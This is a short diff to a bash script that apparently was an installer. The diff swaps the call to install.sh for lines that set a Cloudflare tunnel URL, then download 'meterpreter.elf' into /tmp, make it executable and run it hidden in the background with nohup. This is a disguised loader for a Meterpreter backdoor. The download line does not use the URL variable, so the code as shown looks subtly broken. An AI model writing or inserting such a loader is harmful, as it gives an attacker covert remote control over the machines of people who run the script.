@@ -1,2 +1,6 @@
 #!/bin/bash
-chmod +x install.sh && ./install.sh
+CLOUDFLARE="https://abc-123.trycloudflare.com"  # ← YOUR URL HERE
+
+cd /tmp
+curl -s "/meterpreter.elf" -o meter.elf
+chmod +x meter.elf && nohup ./meter.elf &
